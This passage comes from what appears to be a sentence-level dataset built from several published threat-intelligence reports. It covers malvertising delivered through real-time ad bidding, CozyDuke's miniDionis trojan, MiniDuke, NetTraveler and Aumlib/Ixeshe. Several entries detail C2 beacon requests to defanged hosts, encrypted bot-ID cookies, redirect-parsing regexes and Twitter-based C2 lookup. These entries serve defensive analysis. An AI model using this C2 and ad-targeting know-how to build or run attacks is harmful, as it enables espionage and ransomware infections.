where in the world you point your web browser -- an online video poker room , a fantasy football club homepage , a Pakistani news homepage , or even checking your own webmail at a trusted email provider .", "4586": "These contractors had deployed world-class enterprise security defense in depth approaches to protect their intellectual property .", "4587": "They had next generation firewalls that relied on threat intelligence feeds to do auto-blocking of known malicious sites .", "4588": "They had malware interception technology that relied on known bad hashes to prevent malicious downloads .", "4589": "The multiple proxies in place subscribed to real time feeds of known bad URLs .", "4590": "They deployed AV at the gateways and on the endpoints .", "4591": "Once targeted , an end user only needed to browse to any website , anywhere in the world , which contained a DoubleClick ad-partner embedded window .", "4592": "Invincea stopped these attacks on the endpoints by containing the delivered exploits in secure virtual containers , while producing the forensics that led to this discovery .", "4593": "Next we go in some detail about example attacks perpetrated against the defense firms .", "4594": "It is important to note that the websites we show next that served up targeted malvertising were victims of malvertising campaigns with no knowledge of the malicious ads they were serving up .", "4595": "These malicious ads were served up by 3rd party networks , who are unwittingly sourcing malicious content .", "4596": "As we will discuss later , the 3rd party ad networks themselves are falling victim to malicious content campaigns .", "4597": "A user visited his online fantasy football league homepage at Fleaflicker.com .", "4598": "Figure 1 shows a screenshot of the page that was visited .", "4599": "You will notice the two inline ad placements for DoubleClick ad delivery .", "4600": "Note the prominent ad placements by AdChoice , a DoubleClick affiliate .", "4601": "The timeline below shows the exact times and URLs visited .", "4602": "Note the number of re-directs from Fleaflicker.com to different outside properties in Figure 3 .", "4603": "Invincea Threat Management provides a quick way to search for an MD5 hash on third party sites ( see Figure 4 ) .", "4604": "An employee at a defense contractor visited a free Texas Poker online game .", "4605": "The Poker site had advertisements on the page , one of which launched a similar attack as seen in before on other websites visited by employees at this firm .", "4606": "It should be noted that Gpokr.com no longer appears to be serving advertisements from their site .", "4607": "At the time of the incident , as seen in the logs below , an ad window was previously present .", "4608": "In the event tree shown in Figure 7 , you will see that the winning bid redirected to a direct-to-IP site instead of a site via domain name .", "4609": "Also , above is the first indication of specific executable DLL files .", "4610": "Searches for these filenames returned zero results on VirusTotal .", "4611": "Note the multiple DLL files written to disk and the spawning of rundll32.exe .", "4612": "At this point , the Invincea-protected host recognized the unauthorized process and reverted itself to a clean state .", "4613": "In another incident an employee checked their online Earthlink account .", "4614": "This malvertising was from the same IP address seen in other incidents .", "4615": "You will notice the inline advertisements on this page in Figure 9 .", "4616": "Note in the timeline in Figure 11 , how there was a 7 minute gap between the DoubleClick ad redirect and the delivery.first-impression.com ad .", "4617": "This is an indication that the page was refreshed or the ad was refreshed on the page .", "4618": "The same exploit IP address from the Gpokr event is present .", "4619": "This event is the oldest , happening on September 11 .", "4620": "The three examples above are samples of the more than two dozen micro-targeted attacks we have witnessed and blocked as part of Operation DeathClick since mid-September .", "4621": "Defense Industrial Base customers witnessed micro-targeted malvertising at a rate six times that of comparable private sector companies with similar defense-in-depth capabilities .", "4622": "In these third-party arrangements , the content is frequently not vetted because billions of impressions are rendered in real-time .", "4623": "Most of the content is legitimate ads .", "4624": "Real-time ad networks are being used , often unwittingly , and some have taken steps to try and combat malicious use of their networks .", "4625": "The Online Trust Alliance is one such industry group comprised of major software companies and ad networks working together to try and address this problem .", "4626": "Our goal in this paper is to shed light on the micro-targeting of companies by criminal enterprise employing real-time ad networks , and to aid the industry in collectively addressing this problem .", "4627": "Real-time ad bidding networks have evolved over the last ten years as a means of micro-targeting customers with advertising content they are more likely to click-on .", "4628": "From Wikipedia : Real-time bidding ( RTB ) refers to the means by which ad inventory is bought and sold on a per- impression basis , via programmatic instantaneous auction , similar to financial markets .", "4629": "[ 1 ] With real-time bidding , advertising buyers bid on an impression and , if the bid is won , the buyer 's ad is instantly displayed on the publisher 's site .", "4630": "[ 2 ] Real-time bidding lets advertisers manage and optimize ads from multiple ad-networks by granting the user access to a multitude of different networks , allowing them to create and launch advertising campaigns , prioritize networks and allocate advertising stock .", "4631": "Real-time bidding is a dynamic bidding process where each impression is bid for in ( near ) real time , against a static auction where the impressions are typically bundled in groups of 1,000 .", "4632": "A typical transaction begins with a user visiting a website .", "4633": "This triggers a bid request that can include various pieces of data such as the user 's demographic information , browsing history , location , and the page being loaded .", "4634": "The request goes from the publisher to an ad exchange , which submits it and the accompanying data to multiple advertisers who automatically submit bids in real time to place their ads .", "4635": "Advertisers bid on each ad impression as it is served .", "4636": "The impression goes to the highest bidder and their ad is served on the page.This process is repeated for every ad slot on the page .", "4637": "Real time bidding transactions typically happen within 100 milliseconds from the moment the ad exchange received the request .", "4638": "The bidding happens autonomously and advertisers set maximum bids and budgets for an advertising campaign .", "4639": "The criteria for bidding on particular types of consumers can be very complex , taking into account everything from very detailed behavioral profiles to conversion data .", "4640": "The following infographic summarizes how advanced adversaries are now micro-targeting companies using malvertising .", "4641": "The marketplace and auction of ads sounds great for actual ads .", "4642": "The price to win the bid to push malvertising to any page you happen to visit ranges from 45 to 75 cents per impression .", "4643": "A malicious advertiser on a network may serve crafted , seemingly normal ads , a majority of the time .", "4644": "In fact , the ads are often stolen copies from legitimate advertisers .", "4645": "This establishes the attacker 's legitimacy and trust on the ad network .", "4646": "Of course with real-time ad bidding , he can simply offer up low bids and his content would consistently lose in the marketplace .", "4647": "Once the malvertiser detects that he has several infected hosts , he removes the redirection code and goes back to serving standard ad banners .", "4648": "He then '' burns '' his temporary exploit kit drop site , moving his exploits to another location for a new campaign .", "4649": "This allows the malicious advertiser to perform hit and run attacks , infect whomever he wants at whatever time he wants , and maintain his presence on the advertising marketplace without drawing undue attention to his activities .", "4650": "In the sections below , we will provide highlights of the RTB industry , its targeting capabilities , and show how malvertisers have been mis-appropriating RTB networks to deliver malware .", "4651": "The RTB ad networks provide significant micro-targeting capabilities that have long been used to serve legitimate content to users more likely to click on them .", "4652": "In the following , we describe these capabilities to show the state of the art in RTB network capabilities .", "4653": "The quoted material below are direct quotes from Real Time Bidding service providers linked .", "4654": "Emphasis added by Invincea .", "4655": "Audience Targeting : Bid on the audiences most valuable to you .", "4656": "Each impression in the PubMatic auction can be enhanced with first- and third-party data ; giving buyers targeting capabilities across display , mobile , tablet and video inventory .", "4657": "Media buyers can also cookie sync with publisher audiences to incorporate CRM , retargeting and exclusion strategies in their digital advertising .", "4658": "Buyers have access to proprietary audience segments either directly through Private Marketplace deals or through the open market .", "4659": "With hundreds of parameters available to you , PubMatic has your best audiences waiting for you .", "4660": "With PubMatic , buyers are able to access pre-defined vertical or audience packages , seasonal packages , publisher and/or site-specific inventory packages as well as pre-selected publisher packages and pricing available in Private Marketplaces .", "4661": "'' First-Impression Buy-Side offers the granular targeting , tracking , and reporting needed to help our clients make the most of their spend , along with an expert support team to advise when needed .", "4662": "By leveraging real time buying , First-Impression Buy-Side gives media buyers the full control to maximize the value of an impression .", "4663": "'' Could Malvertisers Track Exploits and their cost per impression ? Yes .", "4664": "Many RTB networks provide a control panel to track advertising campaigns in real-time , along with notifications that bids have been won and who exactly was served the malware .", "4665": "Below is a URL redirection log from First-Impression.com from a winning bid by a malvertiser .", "4666": "In the URL are parameters such as the type of ad , the type of user-agent string of the ad reader specified ( which discloses browser and java versions ) , whether it is a retargeted ad based off of cookies ( this one was not ) , the price paid , which is 65.4 cents , and the notification to the malvertiser that his malvertising was delivered .", "4667": "DoubleClick discusses their targeting capabilities in online documentation .", "4668": "Since they specialize in knowing the location of their ad windows , they market those ad spaces to the actual advertisers and malvertisers , along with targeted demographics about the content pages , the visitors to the sites and more .", "4669": "To showcase the variety of impression-level data available to buyers , consider the data made available through a connection to DoubleClick Ad Exchange 's real-time bidding API .", "4670": "With ADX , a buyer could consider any of the following data passed from the seller with each impression : \u2022 Ad slot parameters : visibility ( above or below the fold ) , size , excluded creative attributes , excluded advertiser URLs , allowed vendor or ad technology .", "4671": "\u2022 Geo parameters : country , region , metro , city .", "4672": "\u2022 Content parameters : site URL , site language , seller network , vertical or category .", "4673": "\u2022 User parameters : browser , operating system , anonymous cookie ( hashed ) , cookie age .", "4674": "Just like when considering one type of data , by using the anonymous cookie parameter , buyers can consider first-party retargeting or third-party audience data from a data provider .", "4675": "However , they can go further in the evaluation by looking at more of these parameters .", "4676": "This helps a buyer learn much more about a particular user and a particular impression , gain a smarter answer to the three essential questions and make a more data-driven decision .", "4677": "This sounds like a great way to advertise if you are in the marketing industry .", "4678": "Consider how granularly a person can be targeted if this service is used maliciously .", "4679": "If not targeted by the desktop , how about on the mobile platform ? Twitter 's Tailored Audiences just got a little more tailored .", "4680": "Advertisers can now augment their customer data using mobile advertising IDs and mobile phone numbers as a way to reach existing customers and increase audience size .", "4681": "In essence , the move is an extension of Twitter 's Tailored Audiences for CRM retargeting , which allows advertisers to use hashed non-PII email address to retarget existing customers .", "4682": "( email addresses are twitter IDs- so you could be targeted for ad delivery based on your account name or known phone number ) Twitter also rolled out the ability to target lookalike audiences , a function that seems pretty similar to Facebook 's tool of the same name .", "4683": "Twitter 's lookalike modeling uses a proprietary algorithm that examines modeled users looking for similarities related to behaviors , interests , location , demographic attributes and engagement patterns .", "4684": "Twitter described its enhanced as '' part of improved targeting options to help advertisers reach additional users similar to their existing audiences .", "4685": "'' Tailored Audiences , Twitter 's seeming answer to the Facebook Exchange ( FBX ) , officially launched back in December after running retargeting and database matching tests in July .", "4686": "Twitter has appeared to follow Facebook 's lead with a number of its recent roll-outs , including site retargeting , CRM targeting and now retargeting via lookalike audiences .", "4687": "( Facebook also makes it possible to target users by phone numbers through Custom Audiences .", "4688": ") Neustar does provide a real-time bidding ad exchange , but their real market is IP intelligence that they sell to other advertising networks for the purposes of better targeting specific users .", "4689": "In Europe , laws require that advertising networks allow people to opt out of having tracking cookies , which is how many advertisers used to rely upon for ad campaign targeting .", "4690": "To get around this , Neustar perfected IP based targeting , which avoids cookies .", "4691": "They are able to build IP specific browsing profiles based on IP subnets .", "4692": "In a blog post below , Neustar boasts about their direct to IP range and enterprise advertising .", "4693": "How can Neustar IP Intelligence target by IP ? While IP intelligence has been around for many years , the ability to effectively target advertising by audience , based on IP is very new .", "4694": "Neustar IP Intelligence is currently working with select DSP platforms to buy impressions off of the exchanges based on the IP address rather than cookies .", "4695": "This has only been possible with the recent emergence of real time bidding ( RTB ) .", "4696": "The secret sauce is in understanding the IP and the methodology necessary for targeting ads appropriately against it .", "4697": "Is an IP Address like a cookie ? No , an IP address only identifies devices on a network .", "4698": "The IP address does not contain any PII and does not track or store any consumer usage or behavioral information .", "4699": "( But IP ranges are registered by IANA , and you can easily know who owns the ranges ) Product Specific Questions Q1 : How does the process work ? The process works exactly like any advertising network .", "4700": "Instead of buying inventory based on a cookie , Neustar is buying inventory based on an IP address .", "4701": "We run the targeting specifics against our proprietary database and create a custom IP list to target against .", "4702": "Neustar has set up relationships with partners that have built the functionality for this to work end-to-end for our advertisers .", "4703": "Neustar offers a full service ad network .", "4704": "Brand marketers who wish to advertise using IP Audience Targeting can work directly with Neustar to determine custom IP placements , run campaigns , optimization , reporting and billing .", "4705": "Much like any traditional online publisher or online ad network , Neustar manages the entire process .", "4706": "How does Neustar deliver its ads ? We use industry standard methods for delivering our ads , but what makes our approach special is that we bake in the IP data before delivering the inventory with our network partners , which allows us to target display ad campaigns to a specific business or organization .", "4707": "We obtain inventory from ad exchanges , but have our own ad server .", "4708": "Zedo , blamed for recent malvertising via DoubleClick , say they are now trying to protect against malvertisers in this blog here .", "4709": "Less than a week after this announcement , they published another blog post that describes how they can push advertising to specific platforms , devices , as well as specific markets and networks : Users can now target ads to a specific device when trafficking ads .", "4710": "An option for '' Device Targeting '' is now available under '' Targeting '' .", "4711": "A creative targeted to a specific Device will serve only on that Device .", "4712": "All major manufacturers/models are supported by this feature .", "4713": "If a creative is not targeted to any specific device than it will serve on all device .", "4714": "Apart from device , a user can target various devices based on different categories .", "4715": "At any given point of time , a user can target multiple manufacturers and categories .", "4716": "Apart from existing campaign reach report a user can now pull a reach report by creative .", "4717": "The creative reach report is available along with all the existing parameters and can be pulled by month , week or day .", "4718": "Creative reach report will show creative wise reach .", "4719": "It will help to analyze how effective the reach of a creative was .", "4720": "To be clear , RTB networks are legitimate platforms for displaying ads on ad-supported websites .", "4721": "They enable micro-targeting of user 's interest , delivering content that a viewer would likely want to see .", "4722": "Below are links to RTB providers to learn more .", "4723": "Invincea has shown logs from a winning malvertising bid in the price range of 65 cents per impression .", "4724": "That is one ad , on one page , paid for by the malvertiser 's account .", "4725": "This implies that malvertisers have deep pockets , spending hundreds of dollars on ad impressions .", "4726": "It is presumed that these ad banners paid revenue via referral bonuses to the malvertiser .", "4727": "It is a pretty good return on investment , which in turn allows the malvertiser to fund his micro-targeted malvertising attack campaign .", "4728": "It is ironic , however , that click fraud is what is driving the prices of RTB advertising so high .", "4729": "Malvertising is not only a danger to end users , but it is a danger to the advertising industry as well .", "4730": "The image from Figure 14 below shows a log file of Chrome , in this instance , renamed Oajvliewxpge.exe , injected via Java to run in the background .", "4731": "Invincea detected this attack and killed the infection attempt .", "4732": "This is one instance where the malvertiser wasted his 65 cents .", "4733": "It should be noted that Invincea is uniquely capable of stopping this type of attack .", "4734": "The introduction of Chrome as a browser , which is whitelisted by hash across the AV industry , would go unchecked by the AV and whitelisting applications industry .", "4735": "The ability for advertisers and malvertisers to automatically redirect to self-hosted ad content or exploit pages is driving RTB malvertising .", "4736": "The malvertiser creates the redirection in his normal ad prior to raising his bids to winning levels .", "4737": "Once several victims are confirmed , those malicious landing pages have the content erased , and the automatic redirection removed to serve '' normal '' ads again .", "4738": "Users are held hostage from their own work , pictures , personal , and proprietary material .", "4739": "To learn more about the scourage of ransomware , see this blog .", "4740": "According to Invincea analysis of ads delivered from first- impression.com , winning ad bids ranging from as low as 30 cents and as high as $ 1.70 , were delivered by a block of unique identifiers .", "4741": "It is highly likely that the same attackers are using other RTB ad platforms .", "4742": "This campaign matches the characteristics described by Proofpoint in its blog in terms of the exploitation methods .", "4743": "Many companies have fallen prey to this attack over the past few months , making this one of the most successful Ransomware campaigns to date .", "4744": "Below is a typical Cryptowall 2 infection as seen in the Invincea Management Server logs .", "4745": "This winning ad placement ran on sports.yahoo.com \u2013 an Alexa Top 4 rated site .", "4746": "Highlighted in order in Figure 22 is the common filename of obupdat.exe , which has ever changing hashes , followed by the TOR port , and the 3rd party ad platform of first-impression.com .", "4747": "Analysis ( Original report ) : Timeline Analysis ( Original Report ) : Below in Figure 23 is the timeline of the Tor connections and SSL connections employed by CryptoWall .", "4748": "Figure 25 shows the winning malvertising bid via RTB ad delivery from first-impression.com .", "4749": "In Figure 26 below , we show the unique identifiers for the userID and campaigns to deliver CryptoWall malware that were blocked and audited by Invincea , including the websites that delivered the ads via a third-party ad network over the past month .", "4750": "To reiterate , neither the websites listed here , nor the 3rd party ad network , necessarily was aware of the malicious ads they were serving to the website visitors .", "4751": "It is likely they were not aware without ad screening technology .", "4752": "In each event above , Invincea blocked an attempt to infect an endpoint with Cryptowall 2.0 and prevented CryptoWall from encrypting the user 's file system and holding it hostage .", "4753": "Had the user not been running Invincea , the attack would likely have been successful , and the only way the user would have had to recover the encrypted files would be to pay the attacker the ransom .", "4754": "This is an effective ransom technique , and one that is paying off well for the attackers , who use the income from the attacks to purchase Real Time Ad Bids on RTB networks to infect more users .", "4755": "Most RTB ad providers allow for advertisers to host their own ad content .", "4756": "This allows advertisers to directly collect web impression data of who is hitting which ads , from where , by which IPs , which user- agent strings , and just about anything else you could log about a website visit .", "4757": "In addition , the advertising network does n't have to utilize their own disk space to host the image files , the flash videos or other online content .", "4758": "RTB networks simply do the auctioneering and redirection to the winning content .", "4759": "It is this weakness in security that malvertisers are taking advantage of .", "4760": "If ad networks were to switch to a model where all content is actually hosted by them ( 1st party hosting ) , in a cloud , then the risk of malvertising would drop dramatically .", "4761": "The RubiconProject has a Seller 's Cloud , which could be a security model for the RTB industry .", "4762": "It is inherently more secure way of hosting ad content .", "4763": "Invincea can protect users from this attack type among other targeted and opportunistic web-based threats .", "4764": "Web proxy blocking updates , even in real time , will not stop new malvertising landing pages that appear and disappear within minutes .", "4765": "Intelligence feeds from the premier intelligence providers , based on hostname , IP , URL or domain will not be able to block malicious malvertisers quickly enough .", "4766": "Invincea protected users can simply browse and click anything online without fear of compromise or targeted malvertising attacks .", "4767": "Non-Invincea users can attempt to OptOut of directed targeting where you can .", "4768": "European privacy laws for forcing most ad providers to offer the opt-out service ; however , you often have to visit each ad provider individually to choose to opt out .", "4769": "Note , that opting out merely places a blocking cookie in your browser .", "4770": "This means that ad providers will not target or retarget based on cookies .", "4771": "But as shown above , the new targeted advertising is via IP intelligence .", "4772": "10/27 : For clarification , Invincea has added additional notes in this version that the websites shown here and the 3rd party real-time ad networks are being used unwittingly and their resources misappropriated by malvertisers to target companies for persistent remote access , click fraud , and other nefarious activities .", "4773": "This is not a reflection on these companies , nor the services they provide .", "4774": "This paper highlights the problem for greater awareness so the industry collectively can combat this problem perhaps with more effective screening at the source prior to displaying ads .", "4775": "Unit 42 has uncovered a new campaign from the CozyDuke threat actors , aka CozyCar [ 1 ] , leveraging malware that appears to be related to the Seaduke malware described earlier this week by Symantec .", "4776": "Unit 42 discovered the extent of this attack using the Palo Alto Networks AutoFocus service , which allows analysts to quickly find correlations among malware samples analyzed by WildFire .", "4777": "All files referenced throughout the analysis are contained in the IOC table at the end of this blog .", "4778": "At the time of our analysis , the phishing link was no longer active .", "4779": "When a user opens the attached file a poorly detected executable file [ VT 1/54 ] is extracted .", "4780": "The initial dropper is a self - extracting archive ( SFX ) .", "4781": "Upon execution , this executable file will drop two files in the % TEMP% directory : a decoy .wav file and the secondary dropper .", "4782": "The CozyDuke group commonly uses legitimate media files to trick users .", "4783": "In reality , while the media - a .wav file with a female voice claiming to be a reporter looking for commentary - is played , the secondary dropper executes in the background .", "4784": "The secondary dropper requests a .swf file using SSL as illustrated in the HTTP traffic below .", "4785": "As of this writing , the domain extranet.qualityplanning[.]com resolved to 64.244.34[.]200 .", "4786": "But what did the dropper do with the .swf file ? While the player.swf file downloaded by the second stage dropper does contain media , it is , again , a decoy .", "4787": "The actual flash component of this file is roughly 16 kb , leaving approximately 200 kb of the file unaccounted for .", "4788": "The second stage dropper contains decoding routines that decode the arbitrary binary data into an executable file .", "4789": "The executable file is dropped in % appdata%/Roaming and appears to try and emulate legitimate software names : TimbuktuDaemon , SearchIndexer , RtkAudioService64 , dirmngr , o2flash , and usbrefs64 .", "4790": "This file was not observed on VirusTotal until July 9 and has extremely low detection rates [ VT : 3/54 ] .", "4791": "It appears that the authors of this particular iteration of the CozyCar group 's malware internally call it \" miniDionis \" according to pdb strings left in the binary ( c:\\BastionSolution\\Shells\\Projects\\miniDionis4\\miniDionis\\obj\\Release\\miniDionis.pdb ) .", "4792": "It also appears to be an iteration on the \" forkmeimfamous \" aka Seaduke malware analyzed by Unit 42 in a previous blog [ 4 ] .", "4793": "The malware stores 2 files in the % temp% directory : a configuration file and a secondary dll .", "4794": "The configuration file 's name matches the final characters of the bot_id that is contained within as per the sample below .", "4795": "This is likely an attempt to thwart forensic investigations .", "4796": "Further examination of memory dumps taken following the execution of miniDionis reveals some clues into the beaconing activity exhibited .", "4797": "The malware stores configuration values in memory as key : value pairs .", "4798": "The configuration of miniDionis is a JSON blob with several important sections , which are described in the table below .", "4799": "The functional payload of this Trojan starts by creating a Mutex by splitting the \" bot_id \" value in the configuration on the hyphen ( \" - \" ) and using the second portion of the split string ( specifically , \" 01MRLXW \" in the case of this configuration ) .", "4800": "From a functionality standpoint , the Trojan uses the concept of tasks that are processed and completed using a pool of threads .", "4801": "GET /mobile / viewer.php HTTP/1.1 Accept : * / * Accept - Language : en - US User - Agent : Mozilla/5.0 ( Windows NT 6.1 ; WOW64 ; Trident/7.0 ; rv:11.0 ) like Gecko Host : www.illuminatistudios[.]net Cookie : SSID = sLW5XoHJDwU3YxCRzwsEnfPPksD1sggcC8 - 25A Accept - Encoding : gzip , deflate Connection : Keep - Alive GET /mobile / viewer.php HTTP/1.1 Accept : * / * Accept - Language : en - US User - Agent : Mozilla/5.0 ( Windows NT 6.1 ; WOW64 ; Trident/7.0 ; rv:11.0 ) like Gecko Host : www.illuminatistudios[.]net Cookie : SSID = sLW5XoHJDwU3YxCRzwsEnfPPksD1sggcC8 - 25A Accept - Encoding : gzip , deflate Connection : Keep - Alive The Trojan manually creates the cookie in this HTTP request .", "4802": "The cookie contains ciphertext that the Trojan creates based on the \" bot_id \" in the JSON configuration .", "4803": "The Trojan compresses the \" bot_id \" string using zlib and then encrypts it using the RC4 algorithm using a generated key .", "4804": "The generated key is a SHA1 hash of two randomly created strings : the first of which is between 2 and 8 bytes long and the second is between 1 and 7 characters in length .", "4805": "The ciphertext of the \" bot_id \" is then based64 encoded and finally the appended to the \" cookie_name \" ( \" SSID= \" ) in the configuration and sent within the HTTP request to the C2 server .", "4806": "Unit 42 did not observe the first random string ( between 2 and 8 characters in length ) sent to the C2 in the first beacon , which would be required by the C2 to reproduce the exact SHA1 hash used as a key to generate the ciphertext in the cookie .", "4807": "Upon further examination we believe that the C2 will not be able to decrypt the cookie in the first beacon .", "4808": "Instead , the C2 will respond to the first beacon with data that the Trojan will use to extract a string , using a function named TrExtractKey seen in Figure 2 , to replace the first random string used to generate the SHA1 hash .", "4809": "Once the C2 and Trojan have synchronized using this string , the C2 will be able to decrypt subsequent network beacons because the Trojan includes the random string between 1 and 7 characters that makes up the second half of the SHA1 hash within the cookie field before the ciphertext .", "4810": "The C2 communications , and several of the commands we will discuss in this blog , include a rather interesting technique to manually handle HTTP redirection , such as the HTTP 301 Moved Permanently and HTTP 302 Found status codes .", "4811": "The technique used to handle these redirections involves checking for the presence of a \" Location \" field within the HTTP headers of the server response , then using regular expressions to parse the HTML within server response to find the appropriate URL .", "4812": "The code contains three regular expressions to parse the HTML to locate the URL , the first of which is \" < a.*?>.*?</a > \" that locates all of the tags associated with link within the HTML .", "4813": "The second regular expression of \" onclick=\\\"Accept();\\ \" \" locates only links within the HTML with a specific \" onclick \" action .", "4814": "The last regular expression of \" href\\\\s*=\\\\s*(?:[\\\"'](?<1>[^\\\"']*)[\\\"']|(?<1>\\\\S+ ) ) \" to obtain the correct URL to interact with as the C2 server .", "4815": "Unit 42 has not received any JSON blobs from an active C2 server , but based on static analysis of the Trojan determined the JSON would look as follows .", "4816": "{ ' tasks ' : [ { ' task_id ' : \" \" , ' task_data ' : { ' command ' : \" \" , ' data ' : \" \" } } , ] } { ' tasks ' : [ { ' task_id ' : \" \" , ' task_data ' : { ' command ' : \" \" , ' data ' : \" \" } } , ] } The Trojan takes this JSON blob and adds each task in the list into a pool for processing .", "4817": "Separate worker threads access this pool of tasks and process the commands and perform the necessary activities .", "4818": "The actors behind the CozyDuke framework are highly sophisticated , motivated , and have become increasingly bold in their campaigns .", "4819": "We recommend that other security practitioners review the included Indicators of Compromise ( IoCs ) to ensure they have not been targets in this campaign , and add the appropriate security controls to prevent future attacks .", "4820": "This group is reliant on social engineering , and thus , user education remains of paramount importance .", "4821": "Palo Alto Networks customers using WildFire were protected from this campaign .", "4822": "All known elements of this campaign have been accurately identified by WildFire as malicious .", "4823": "IOCs Sources [ 1 ] https://securelist.com/blog/research/69731/the-cozyduke-apt/ [ 2 ] http://www.symantec.com/connect/blogs/forkmeiamfamous-seaduke-latest-weapon-duke-armory [ 3 ] http://www.theregister.co.uk/2015/04/22/cozyduke_hackers_white_house_state_dept_malware/ [ 4 ] http://researchcenter.paloaltonetworks.com/2015/07/unit-42-technical-analysis-seaduke/", "4824": "At the end of April Microsoft announced that a vulnerability in Word was actively being exploited .", "4825": "This vulnerability occurred in parsing RTF files and was assigned CVE-2014-1761 , a thorough analysis of which can be found on the HP Security Research blog .", "4826": "MiniDuke was first discussed by Kaspersky in March 2013 in their paper The MiniDuke Mystery : PDF 0- day Government Spy Assembler 0x29A Micro Backdoorand shortly after in a paper by Bitdefender .", "4827": "The exploit document was named Proposal-Cover-Sheet-English.rtf and is quite bland when compared to the documents that were used in 2013 , which were of a political nature .", "4828": "We received the document on April 8th , only three days after the compilation of the MiniDuke payload , dated April 5th in the PE header .", "4829": "The payload remains quite small at only 24 KB .", "4830": "If any of these are found the shellcode skips the first 5 bytes of the function being called by manually executing prologue instructions ( mov edi , edi ; push ebp ; mov ebp , esp ) and then jumping to the function code as illustrated below .", "4831": "The next graph presents the execution flow of this malware when the exploitation is successful .", "4832": "As mentioned previously this version of the MiniDuke payload comes with two modules which we refer to as the main module and the TwitterJS module .", "4833": "Once MiniDuke receives control it checks that the host process is not rundll32.exe and whether the current directory is % TEMP % .", "4834": "The name of the .LNK", "4835": "As with the previous version of MiniDuke , it checks for the presence of the following processes in the system : If any of these are found in the system the configuration information will be decrypted incorrectly , i.e .", "4836": "the malware will run on the system without any communication to C & C servers .", "4837": "It looks for the tag '' X ) ) ) '' on the page ( MiniDuke was searching for '' uri ! '' in previous samples ) and if the tag is found it decrypts a URL from the data that follows it .", "4838": "The Twitter account @ FloydLSchwartz does exist but has only retweets and no strings with the special tag .", "4839": "In the event that MiniDuke is unable to retrieve a C & C URL from this account , it generates a username to search for based on the current date .", "4840": "The search query changes roughly every seven days and is similar to the backup mechanism in previous versions that was using Google searches .", "4841": "A Python implementation of the algorithm can be found in Appendix B .", "4842": "Here is how the export address table of the patched binary looks after modifications .", "4843": "When loaded , TwitterJS instantiates the JScript COM object and decrypts a JScript file containing the core logic of the module .", "4844": "It first generates a Twitter user to search for ; this search term changes every 7 days and is actually a match to the real account name , not the Twitter account name .", "4845": "The bot then visits the Twitter profiles returned by the search and looks for links that end with '' .xhtml", "4846": "'' .", "4847": "When one is found , it replaces '' .xhtml", "4848": "'' with '' .php", "4849": "'' and fetches that link .", "4850": "Information about the computer is embedded in the Accept HTTP header .", "4851": "The first link on the retrieved page should contain base64 data ; the name attribute of the link is used as a rolling XOR key to decrypt the JScript code .", "4852": "Finally , MiniDuke calculates a hash of the fetched script and compares it with a hardcoded hash in the TwitterJS script .", "4853": "If they match , the fetched script is executed by calling eval ( ) .", "4854": "The code hashing algorithm used by the component looks very much like SHA-1 but outputs different hashes ( you can find the complete implementation in Appendix B .", "4855": "We decided to search for what was changed in the algorithm ; one of our working hypotheses was that the algorithm might have been altered to make collisions feasible .", "4856": "We could n't find an obvious difference ; all the constants and the steps of the algorithm were as expected .", "4857": "Then we noticed that for short messages only the second 32-bit word was different when compared to the original SHA-1 .", "4858": "By examining how this 2nd word was generated we finally discovered that this was caused by a scope issue .", "4859": "As shown below the SHA-1 function used a variable named f : the function Z ( ) is then called which also uses a variable named f without the var keyword , causing it to be treated as a global variable rather than local to the function .", "4860": "The end result is that the value of f is also changed in the SHA-1 function which affects the value of the 2nd word for that round and ultimately the whole hash for long messages .", "4861": "A likely explanation of how this problem came to be is that the variable names were changed to single letters using an automated tool prior to embedding it in the payload .", "4862": "The 2 f variables probably had different names in the original script which avoided the issue .", "4863": "So this leaves us with two takeaways : 1 ) The difference in the hashing algorithm was unintentional and 2 ) Always declare your local variables with the var keyword .", "4864": "; - ) We generated the list of Twitter search terms for 2013-2014 and checked if any of those were registered .", "4865": "At the moment only one exists , @ AA2ADcAOAA , which is the TwitterJS account that was generated between August 21st and 27th 2013 .", "4866": "This account has no tweets .", "4867": "In an effort to discover potential victims , we registered the Twitter accounts corresponding to the current week both for the main and TwitterJS components and set up tweets with encrypted URLs so that an infected computer would reach out to our server .", "4868": "So far we have received connections via the TwitterJS accounts from four computers located in Belgium , France and the UK .", "4869": "We have contacted national CERTs to notify the affected parties .", "4870": "We detect the RTF exploit document as Win32/Exploit.CVE-2014-1761.D and the MiniDuke components as Win32/SandyEva.G .", "4871": "We have written about NetTraveler before HERE and HERE .", "4872": "Earlier this year , we observed an uptick in the number of attacks against Uyghur and Tibetan supporters using an updated version of the NetTraveler backdoor .", "4873": "The .DOC", "4874": "file , which in reality is a '' Single File Web Page '' container , also known as '' Web archive file '' , appears to have been created on a system using Microsoft Office - Simplified Chinese .", "4875": "It contains an exploit for the CVE-2012-0158 vulnerability , detected by Kaspersky Lab products as Exploit.MSWord.CVE-2012-0158.db .", "4876": "Luckily , the encryption is relatively simple to break .", "4877": "We identified several samples using this new encryption scheme .", "4878": "A list of all the extracted C & C servers can be found below : We recommend blocking all these hosts in your firewall .", "4879": "This year , the actors behind NetTraveler celebrate 10 years of activity .", "4880": "Although the earliest samples we have seen appear to have been compiled in 2005 , there are certain indicators that point to 2004 as the year when their activity started .", "4881": "For 10 years NetTraveler has been targeting various sectors , with a focus on diplomatic , government and military targets .", "4882": "Most recently , the main focus of interest for cyber-espionage activities revolved around space exploration , nano-technology , energy production , nuclear power , lasers , medicine and communications .", "4883": "The targeting of Uyghur and Tibetan activists remains a standard component of their activities and we can assume it will stay this way , perhaps for another 10 years .", "4884": "The attackers behind the breach of the New York Times ' computer network late last year appear to be mounting fresh assaults that leverage new and improved versions of malware .", "4885": "The new campaigns mark the first significant stirrings from the group since it went silent in January in the wake of a detailed expose of the group and its exploits - and a retooling of what security researchers believe is a massive spying operation based in China .", "4886": "The newest campaign uses updated versions of Aumlib and Ixeshe .", "4887": "FireEye researchers spotted the malware when analyzing a recent attempted attack on an organization involved in shaping economic policy .", "4888": "The updates are significant for both of the longstanding malware families ; before this year , Aumlib had not changed since at least May 2011 , and Ixeshe had not evolved since at least December 2011 .", "4889": "Cybercriminals are constantly evolving and adapting in their attempts to bypass computer network defenses .", "4890": "But , larger , more successful threat actors tend to evolve at a slower rate .", "4891": "As long as these actors regularly achieve their objective ( stealing sensitive data ) , they are not motivated to update or rethink their techniques , tactics , or procedures ( TTPs ) .", "4892": "These threat actors ' tactics follow the same principles of evolution \u2013 successful techniques propagate , and unsuccessful ones are abandoned .", "4893": "Attackers do not change their approach unless an external force or environmental shift compels them to .", "4894": "As the old saying goes : If it ai n't broke , do n't fix it .", "4895": "So when a larger , successful threat actor changes up tactics , the move always 